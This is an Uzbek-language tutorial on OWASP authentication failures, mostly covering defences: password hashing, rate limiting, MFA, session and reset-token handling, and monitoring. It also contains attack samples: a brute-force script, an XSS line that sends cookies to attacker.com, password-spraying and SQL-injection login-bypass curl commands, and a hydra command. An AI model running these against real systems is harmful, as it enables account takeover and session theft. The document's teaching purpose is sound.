Identification & Authentication Failures: Batafsil Tahlil va Himoya Choralari
📋 Kirish
Identification & Authentication Failures (Identifikatsiya va Autentifikatsiya Xatolari) - bu OWASP Top 10 2021 ro'yxatida 7-o'rinda turgan xavfsizlik zaifligidir. Ilgari bu "Broken Authentication" nomi bilan ma'lum edi.
Bu zaiflik foydalanuvchi identifikatsiyasi va autentifikatsiya jarayonlarida yuzaga keladigan xatolar natijasida hacker yoki tajovuzkorlar tizimga noqonuniy kirishlari mumkin bo'lgan holatlarni anglatadi.

🎯 Asosiy Tushunchalar
Identifikatsiya (Identification)
Foydalanuvchining kim ekanligini aniqlash jarayoni. Masalan: login, email, ID.
Autentifikatsiya (Authentication)
Foydalanuvchining haqiqatan ham u aytgan odam ekanligini tasdiqlash jarayoni. Masalan: parol, biometrik ma'lumotlar, token.
Avtorizatsiya (Authorization)
Autentifikatsiya qilingan foydalanuvchining qaysi resurslarga kirish huquqi borligini aniqlash.

🔴 Zaiflikning Kelib Chiqish Sabablari
1. Zaif Parol Siyosati

Oddiy parollarni qabul qilish (123456, password, qwerty)
Parol uzunligi bo'yicha talablarning yo'qligi
Maxsus belgilar talab qilinmasligi

2. Credential Stuffing Hujumlariga Qarshi Himoyaning Yo'qligi

Brute-force hujumlarni cheklovchi mexanizmlar yo'q
Rate limiting (so'rovlar cheklovi) amalga oshirilmagan
CAPTCHA yoki boshqa bot-detection vositalar ishlatilmagan

3. Session Management Xatolari

Session ID ni URL da uzatish
Session timeout yo'q yoki juda uzoq
Session ID regeneratsiya qilinmasligi
Logout jarayonida session tugallanmasligi

4. Parollarni Noto'g'ri Saqlash

Parollarni ochiq (plain text) holatda saqlash
Zaif hash algoritmlarini ishlatish (MD5, SHA1)
Salt ishlatmaslik

5. Multi-Factor Authentication (MFA) Yo'qligi

Ikkinchi autentifikatsiya qatlami mavjud emas
Muhim operatsiyalar uchun qo'shimcha tasdiqlash yo'q

6. Password Recovery Jarayonidagi Xatolar

"Parolni unutdim" funksiyasi orqali ma'lumot to'plash
Xavfsiz savol-javoblardan foydalanish
Email orqali parolni yuborish

7. Session Fixation Zaifliklarl

Session ID ni foydalanuvchi login qilgunga qadar o'zgartirilmasligi
Oldindan berilgan session ID ni qabul qilish


💥 Hujum Turlari va Misollar
1. Brute Force Attack
Ta'rif: Hacker barcha mumkin bo'lgan parol kombinatsiyalarini sinab ko'radi.
python# Oddiy brute force misoli (faqat ta'limiy maqsadda!)
import requests

username = "admin"
passwords = ["123456", "password", "admin", "qwerty"]
url = "https://example.com/login"

for password in passwords:
    response = requests.post(url, data={
        "username": username,
        "password": password
    })
    
    if "Invalid credentials" not in response.text:
        print(f"Parol topildi: {password}")
        break
Himoya: Rate limiting, account lockout, CAPTCHA

2. Credential Stuffing
Ta'rif: Boshqa saytlardan o'g'irlangan username/password kombinatsiyalarini sinash.
Misol stsenari:

Hacker 100,000 ta login/parol kombinatsiyasini darknet-dan sotib oladi
Ushbu ma'lumotlarni sizning saytingizda sinab ko'radi
Odamlar ko'p saytlarda bir xil parol ishlatganligi uchun ba'zi hisoblar buziladi

Statistika: Credential stuffing hujumlari 2023-yilda 30% ga oshgan.

3. Session Hijacking
Ta'rif: Foydalanuvchining session ID sini o'g'irlab, uning nomidan tizimga kirish.
javascript// XSS orqali session cookie o'g'irlash misoli
<script>
  // Hujumkor bu kodni inject qiladi
  var sessionId = document.cookie;
  fetch('https://attacker.com/steal?cookie=' + sessionId);
</script>
```

**URL orqali session ID uzatish (NOTO'G'RI):**
```
https://example.com/dashboard?sessionid=abc123xyz

4. Password Spraying
Ta'rif: Ko'p foydalanuvchilarga bir nechta eng keng tarqalgan parollarni sinash.
bash# Misol: 1000 ta foydalanuvchiga "Password123" ni sinash
for user in users.txt; do
  curl -X POST https://example.com/login \
    -d "username=$user&password=Password123"
done
```

---

### 5. **Weak Password Recovery**

**Noto'g'ri misol:**
```
Savollar:
- Onangizning qizlik familiyasi?
- Birinchi uy hayvoniningiz nomi?
- Tug'ilgan shahringiz?
Bu ma'lumotlarni social engineering yoki social media orqali topish oson.

🛡️ Himoya Choralari
1. Kuchli Parol Siyosati
pythonimport re

def validate_password(password):
    """
    Parol talablari:
    - Kamida 12 ta belgi
    - Katta va kichik harflar
    - Raqamlar
    - Maxsus belgilar
    """
    if len(password) < 12:
        return False, "Parol kamida 12 ta belgidan iborat bo'lishi kerak"
    
    if not re.search(r'[A-Z]', password):
        return False, "Kamida bitta katta harf kerak"
    
    if not re.search(r'[a-z]', password):
        return False, "Kamida bitta kichik harf kerak"
    
    if not re.search(r'[0-9]', password):
        return False, "Kamida bitta raqam kerak"
    
    if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
        return False, "Kamida bitta maxsus belgi kerak"
    
    # Keng tarqalgan parollarni tekshirish
    common_passwords = ["Password123!", "Qwerty123!", "Admin@123"]
    if password in common_passwords:
        return False, "Bu parol juda keng tarqalgan"
    
    return True, "Parol kuchli"

# Test
print(validate_password("weakpass"))  # False
print(validate_password("StrongP@ssw0rd123"))  # True

2. Parollarni Xavfsiz Saqlash
pythonimport bcrypt
import hashlib

# NOTO'G'RI: Plain text
password = "mypassword"
# Database: INSERT INTO users VALUES ('john', 'mypassword')

# NOTO'G'RI: MD5 (juda zaif)
password_hash = hashlib.md5("mypassword".encode()).hexdigest()

# TO'G'RI: bcrypt bilan salt
def hash_password(password):
    # Salt avtomatik yaratiladi
    salt = bcrypt.gensalt(rounds=12)  # 12 rounds = yetarlicha kuchli
    hashed = bcrypt.hashpw(password.encode('utf-8'), salt)
    return hashed

def verify_password(password, hashed):
    return bcrypt.checkpw(password.encode('utf-8'), hashed)

# Foydalanish
user_password = "MySecureP@ss123"
hashed_password = hash_password(user_password)
print(f"Hashed: {hashed_password}")

# Tekshirish
is_valid = verify_password("MySecureP@ss123", hashed_password)
print(f"Valid: {is_valid}")
Tavsiya: Argon2id yoki scrypt ham yaxshi tanlovlar.

3. Rate Limiting va Account Lockout
pythonfrom flask import Flask, request, jsonify
from datetime import datetime, timedelta
from collections import defaultdict

app = Flask(__name__)

# Har bir IP uchun login urinishlarini saqlash
login_attempts = defaultdict(list)
blocked_ips = {}

MAX_ATTEMPTS = 5
BLOCK_DURATION = timedelta(minutes=15)
TIME_WINDOW = timedelta(minutes=5)

@app.route('/login', methods=['POST'])
def login():
    ip_address = request.remote_addr
    current_time = datetime.now()
    
    # Blocklangan IP tekshirish
    if ip_address in blocked_ips:
        block_time = blocked_ips[ip_address]
        if current_time < block_time:
            remaining = (block_time - current_time).seconds // 60
            return jsonify({
                "error": f"IP manzil {remaining} daqiqaga bloklangan"
            }), 429
        else:
            # Block muddati tugagan
            del blocked_ips[ip_address]
            login_attempts[ip_address] = []
    
    # Eski urinishlarni tozalash
    login_attempts[ip_address] = [
        attempt for attempt in login_attempts[ip_address]
        if current_time - attempt < TIME_WINDOW
    ]
    
    # Urinishlar sonini tekshirish
    if len(login_attempts[ip_address]) >= MAX_ATTEMPTS:
        blocked_ips[ip_address] = current_time + BLOCK_DURATION
        return jsonify({
            "error": "Juda ko'p muvaffaqiyatsiz urinish. IP bloklandi."
        }), 429
    
    # Login jarayoni
    username = request.json.get('username')
    password = request.json.get('password')
    
    # Bu yerda haqiqiy autentifikatsiya bo'ladi
    if authenticate(username, password):
        login_attempts[ip_address] = []  # Reset attempts
        return jsonify({"success": True})
    else:
        login_attempts[ip_address].append(current_time)
        remaining_attempts = MAX_ATTEMPTS - len(login_attempts[ip_address])
        return jsonify({
            "error": "Noto'g'ri login yoki parol",
            "remaining_attempts": remaining_attempts
        }), 401

def authenticate(username, password):
    # Bu yerda database bilan tekshirish
    return False  # Misol uchun

4. Multi-Factor Authentication (MFA)
pythonimport pyotp
import qrcode
from io import BytesIO
import base64

def setup_mfa(username):
    """
    Foydalanuvchi uchun MFA sozlash
    """
    # Secret key yaratish
    secret = pyotp.random_base32()
    
    # TOTP (Time-based OTP) yaratish
    totp_uri = pyotp.totp.TOTP(secret).provisioning_uri(
        name=username,
        issuer_name="MyApp"
    )
    
    # QR kod yaratish
    qr = qrcode.QRCode(version=1, box_size=10, border=5)
    qr.add_data(totp_uri)
    qr.make(fit=True)
    
    img = qr.make_image(fill_color="black", back_color="white")
    
    # Database ga secret ni saqlash
    # save_to_db(username, secret)
    
    return secret, img

def verify_mfa_code(secret, user_code):
    """
    Foydalanuvchi kiritgan kodni tekshirish
    """
    totp = pyotp.TOTP(secret)
    # 30 soniyalik window bilan tekshirish
    return totp.verify(user_code, valid_window=1)

# Foydalanish misoli
username = "john@example.com"
secret, qr_image = setup_mfa(username)
print(f"Secret key: {secret}")

# Foydalanuvchi Google Authenticator ga QR kodni scan qiladi
# Keyin 6 raqamli kodni kiritadi
user_input = "123456"  # Foydalanuvchi kirgan kod
is_valid = verify_mfa_code(secret, user_input)
print(f"MFA valid: {is_valid}")

5. Xavfsiz Session Management
pythonfrom flask import Flask, session, request, redirect
import secrets
import os
from datetime import timedelta

app = Flask(__name__)

# Kuchli secret key
app.secret_key = secrets.token_hex(32)

# Session konfiguratsiyasi
app.config['SESSION_COOKIE_SECURE'] = True  # Faqat HTTPS
app.config['SESSION_COOKIE_HTTPONLY'] = True  # JavaScript orqali kirib bo'lmaydigan
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'  # CSRF himoyasi
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=30)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    if authenticate(username, password):
        # MUHIM: Session ID ni regeneratsiya qilish
        session.clear()
        session.permanent = True
        
        # Foydalanuvchi ma'lumotlarini saqlash
        session['user_id'] = get_user_id(username)
        session['username'] = username
        session['login_time'] = datetime.now().isoformat()
        
        # Session fixation himoyasi uchun
        session.modified = True
        
        return redirect('/dashboard')
    
    return "Invalid credentials", 401

@app.route('/logout')
def logout():
    # Session ni to'liq tozalash
    session.clear()
    return redirect('/login')

@app.before_request
def check_session_timeout():
    """
    Har bir request da session timeout ni tekshirish
    """
    if 'login_time' in session:
        login_time = datetime.fromisoformat(session['login_time'])
        if datetime.now() - login_time > timedelta(minutes=30):
            session.clear()
            return redirect('/login?timeout=true')

def authenticate(username, password):
    # Database bilan tekshirish
    return True  # Misol

def get_user_id(username):
    return 1  # Misol

6. Xavfsiz Password Recovery
pythonimport secrets
from datetime import datetime, timedelta
from flask import Flask, request, jsonify
import smtplib
from email.mime.text import MIMEText

app = Flask(__name__)

# Password reset tokenlarini saqlash (production da Redis ishlatish kerak)
reset_tokens = {}

@app.route('/forgot-password', methods=['POST'])
def forgot_password():
    email = request.json.get('email')
    
    # Email database da borligini tekshirish
    user = get_user_by_email(email)
    if not user:
        # Security: Email topilmaganligi haqida aniq xabar bermaslik
        return jsonify({
            "message": "Agar bu email tizimda bo'lsa, tiklash havolasi yuboriladi"
        }), 200
    
    # Xavfsiz token yaratish
    token = secrets.token_urlsafe(32)
    
    # Token ni saqlash (30 daqiqa amal qiladi)
    reset_tokens[token] = {
        'user_id': user['id'],
        'email': email,
        'expires': datetime.now() + timedelta(minutes=30),
        'used': False
    }
    
    # Email yuborish
    reset_link = f"https://example.com/reset-password?token={token}"
    send_reset_email(email, reset_link)
    
    return jsonify({
        "message": "Agar bu email tizimda bo'lsa, tiklash havolasi yuboriladi"
    }), 200

@app.route('/reset-password', methods=['POST'])
def reset_password():
    token = request.json.get('token')
    new_password = request.json.get('new_password')
    
    # Token validatsiyasi
    if token not in reset_tokens:
        return jsonify({"error": "Noto'g'ri yoki muddati o'tgan token"}), 400
    
    token_data = reset_tokens[token]
    
    # Token muddatini tekshirish
    if datetime.now() > token_data['expires']:
        del reset_tokens[token]
        return jsonify({"error": "Token muddati tugagan"}), 400
    
    # Token ishlatilganligini tekshirish
    if token_data['used']:
        return jsonify({"error": "Token allaqachon ishlatilgan"}), 400
    
    # Parol validatsiyasi
    is_valid, message = validate_password(new_password)
    if not is_valid:
        return jsonify({"error": message}), 400
    
    # Parolni yangilash
    user_id = token_data['user_id']
    update_password(user_id, new_password)
    
    # Token ni ishlatilgan deb belgilash
    token_data['used'] = True
    
    # Barcha sessiyalarni bekor qilish
    revoke_all_sessions(user_id)
    
    # Email xabarnoma yuborish
    send_password_changed_notification(token_data['email'])
    
    return jsonify({"message": "Parol muvaffaqiyatli o'zgartirildi"}), 200

def send_reset_email(email, reset_link):
    """Email yuborish funksiyasi"""
    # SMTP konfiguratsiyasi
    pass

def get_user_by_email(email):
    # Database dan foydalanuvchini topish
    return {'id': 1, 'email': email}

def update_password(user_id, new_password):
    # Database da parolni yangilash
    pass

def revoke_all_sessions(user_id):
    # Foydalanuvchining barcha sessiyalarini bekor qilish
    pass

def send_password_changed_notification(email):
    # Parol o'zgartirilganligi haqida xabarnoma
    pass

7. CAPTCHA Implementation
pythonfrom flask import Flask, request, jsonify
import requests

app = Flask(__name__)

RECAPTCHA_SECRET_KEY = "your_secret_key_here"

@app.route('/login', methods=['POST'])
def login_with_captcha():
    username = request.json.get('username')
    password = request.json.get('password')
    captcha_response = request.json.get('captcha_response')
    
    # reCAPTCHA tekshirish
    if not verify_recaptcha(captcha_response):
        return jsonify({"error": "CAPTCHA tekshiruvi muvaffaqiyatsiz"}), 400
    
    # Login jarayoni
    if authenticate(username, password):
        return jsonify({"success": True})
    
    return jsonify({"error": "Noto'g'ri login ma'lumotlari"}), 401

def verify_recaptcha(response):
    """
    Google reCAPTCHA v3 ni tekshirish
    """
    payload = {
        'secret': RECAPTCHA_SECRET_KEY,
        'response': response
    }
    
    r = requests.post(
        'https://www.google.com/recaptcha/api/siteverify',
        data=payload
    )
    
    result = r.json()
    
    # Score > 0.5 bo'lsa, inson deb hisoblanadi
    return result.get('success') and result.get('score', 0) > 0.5

def authenticate(username, password):
    return True  # Misol

📊 Real-World Misollar
1. LinkedIn (2012)

Muammo: 6.5 million parol SHA1 bilan hash qilingan, lekin salt ishlatilmagan
Natija: Hackerlar tezda parollarni decrypt qildilar
Zarar: Foydalanuvchilar ma'lumotlari tarqaldi

2. Yahoo (2013-2014)

Muammo: 3 milliard hisob buzildi, zaif autentifikatsiya
Natija: Kompaniya qiymati $350 million ga tushdi
Sabab: Eski autentifikatsiya tizimi, MFA yo'q

3. Equifax (2017)

Muammo: 147 million kishi ma'lumotlari o'g'irlandi
Sabab: Apache Struts zaifligidan foydalanilgan, lekin authentication ham zaif edi
Natija: $700 million jarima


✅ Best Practices Checklist
Dasturchilar uchun

 Parollar faqat bcrypt/Argon2 bilan hash qilish
 Kamida 12 belgidan iborat parol talab qilish
 MFA (Multi-Factor Authentication) ni joriy qilish
 Rate limiting va account lockout mexanizmlari
 Session ID ni URL da uzatmaslik
 Session timeout ni sozlash (15-30 minut)
 Login qilganda session ID ni regeneratsiya qilish
 HTTPS ni majburiy qilish
 HttpOnly va Secure cookie flaglaridan foydalanish
 Password reset token larni xavfsiz qilish (30 daqiqalik muddatli)
 Brute force hujumlarga qarshi CAPTCHA
 Failed login attempts ni log qilish
 Parol o'zgartirilganda email xabarnomasi
 Keng tarqalgan parollarni rad etish

Tashkilotlar uchun

 Password policy ni tuzish va qo'llash
 Security awareness training
 Regular penetration testing
 Incident response plan
 Third-party authentication service larni ko'rib chiqish (Auth0, Okta)


🔧 Testing va Vulnerability Scanning
Manual Testing
bash# 1. Zaif parollarni sinash
curl -X POST https://example.com/login \
  -d "username=admin&password=admin"

# 2. SQL Injection orqali authentication bypass
curl -X POST https://example.com/login \
  -d "username=admin' OR '1'='1&password=anything"

# 3. Brute force testing
hydra -l admin -P passwords.txt example.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# 4. Session fixation testing
# Session ID ni olish va boshqa browserda ishlatishga harakat qilish
Automated Tools
bash# OWASP ZAP
zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true' https://example.com

# Burp Suite (GUI)
# Authentication Testing plugin ishlatish

# Nikto
nikto -h https://example.com

📈 Monitoring va Detection
python# Suspicious activity detection
import logging
from datetime import datetime

class AuthenticationMonitor:
    def __init__(self):
        self.logger = logging.getLogger('auth_monitor')
        
    def log_failed_attempt(self, username, ip_address):
        self.logger.warning(f"Failed login attempt: {username} from {ip_address}")
        
        # Alert agar bir minutda 10 dan ortiq urinish bo'lsa
        recent_attempts = self.count_recent_attempts(ip_address)
        if recent_attempts > 10:
            self.send_alert(f"Possible brute force attack from {ip_address}")
    
    def log_successful_login(self, username, ip_address):
        self.logger.info(f"Successful login: {username} from {ip_address}")
        
        # Agar yangi joydan login bo'lsa
        if self.is_new_location(username, ip_address):
            self.send_alert(f"Login from new location: {username} at {ip_address}")
    
    def detect_credential_stuffing(self, username, ip_address):
        # Turli username lardan bir xil IP ga ko'p urinishlar
        unique_usernames = self.get_unique_usernames_from_ip(ip_address)
        if len(unique_usernames) > 50:
            self.send_alert(f"Possible credential stuffing from {ip_address}")
    
    def send_alert(self, message):
        # Email, SMS, Slack notification
        print(f"ALERT: {message}")

🎓 Xulosa
Identification & Authentication Failures jiddiy xavfsizlik muammosi bo'lib, u ko'p tizimlarning buzilishiga sabab bo'lgan. Yuqorida keltirilgan himoya choralari va best practice larni qo'llash orqali siz tizimingizni sezilarli darajada xavfsizroq qilishingiz mumkin.
Eng Muhim Nuqtalar:

Hech qachon parollarni plain text da saqlamang
MFA ni majburiy qiling
Rate limiting va CAPTCHA dan foydalaning
Session management ni to'g'ri amalga oshiring
Regular security audit va penetration testing o'tkazing


📚 Qo'shimcha Manbalar

OWASP Authentication Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
NIST Digital Identity Guidelines: https://pages.nist.gov/800-63-3/
OWASP Top 10 2021: https://owasp.org/Top10/


Eslatma: Bu material faqat ta'limiy maqsadlarda tayyorlangan. Hujum vositalarini noqonuniy maqsadlarda ishlatish jinoyat hisoblanadi.Retry